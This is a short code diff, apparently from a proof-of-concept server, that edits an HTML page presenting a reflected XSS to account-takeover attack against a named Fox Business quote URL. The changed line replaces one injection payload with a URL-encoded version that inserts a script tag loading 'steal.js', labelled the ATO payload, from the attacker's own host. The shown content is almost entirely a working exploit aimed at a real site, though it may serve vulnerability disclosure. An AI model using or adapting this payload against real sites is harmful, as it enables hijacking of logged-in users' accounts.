@@ -165,7 +165,7 @@ const server = http.createServer((req, res) => {
   res.end(`<!DOCTYPE html><html><body style="font-family:system-ui;max-width:700px;margin:2rem auto">
 <h2>Reflected XSS &rarr; Account Takeover PoC</h2>
 <h3>Trigger URL (login to Fox Business first):</h3>
-<code style="word-break:break-all;background:#f0f0f0;padding:8px;display:block">http://origin.quote.foxbusiness.com/trade/go?symbol=aapl';$.getScript('${SELF}/steal.js');//</code>
+<code style="word-break:break-all;background:#f0f0f0;padding:8px;display:block">http://origin.quote.foxbusiness.com/trade/go?symbol=aapl%27%2B%28function%28%29%7Bvar%20s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27${SELF}/steal.js%27%3B%28document.head%7C%7Cdocument.documentElement%29.appendChild%28s%29%7D%29%28%29%2B%27</code>
 <h3>Links:</h3>
 <ul>
 <li><a href="/steal.js">steal.js</a> — ATO payload</li>
